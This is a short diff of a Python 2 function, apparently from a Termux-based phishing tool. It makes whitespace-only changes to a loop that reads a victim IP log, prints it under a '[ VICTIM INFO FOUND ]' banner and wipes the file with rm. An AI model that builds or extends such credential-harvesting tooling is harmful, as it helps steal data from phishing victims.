@@ -134,6 +134,7 @@ def waitCreds():
             print ' {0}***** HOPE YOU ARE ENJOYING. SO PLEASE MAKE IT MORE POPULAR *****{1}\n {0}{1}'.format(RED, END)
             
         creds.close()
+
         with open('ServerTermux/www/iplog.txt') as creds:
             lines = creds.read().rstrip()
         if len(lines) != 0: 
@@ -141,7 +142,7 @@ def waitCreds():
             print ' {0}[ VICTIM INFO FOUND ]{1}:\n {0}%s{1}'.format(GREEN, END) % lines
             system('rm -rf ServerTermux/www/iplog.txt && touch ServerTermux/www/iplog.txt')
             print '================================================='.format(RED, END)
-           
+
         creds.close()
 
 def runPEnv():
